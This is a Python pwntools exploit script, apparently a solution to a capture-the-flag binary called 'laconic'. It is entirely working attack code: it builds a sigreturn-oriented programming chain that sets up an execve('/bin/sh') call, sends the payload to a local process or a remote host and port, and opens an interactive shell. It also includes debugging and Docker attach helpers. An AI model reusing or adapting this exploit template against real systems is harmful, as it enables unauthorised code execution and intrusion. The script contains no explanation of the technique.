#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './laconic'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '94.237.59.98', 33258

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    b *_start+23
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================

def exploit():
    global io
    io = initialize()
    bin_sh = 0x43238
    syscall = next(elf.search(asm("syscall")))
    frame = SigreturnFrame()
    frame.rax = 0x3b            # syscall number for execve()
    frame.rdi = bin_sh         # pointer to "/bin/sh" 
    frame.rsi = 0             # NULL
    frame.rdx = 0             # NULL
    frame.rip = syscall        # syscall instruction
    rop = ROP(elf)
    rop.rax = constants.SYS_rt_sigreturn
    rop.raw(syscall)

    offset = 0x8
    payload = flat({
        offset: [rop.chain()]
    })
    payload += bytes(frame)
    io.send(payload[:0x106])
    io.interactive()

if __name__ == '__main__':
    exploit()
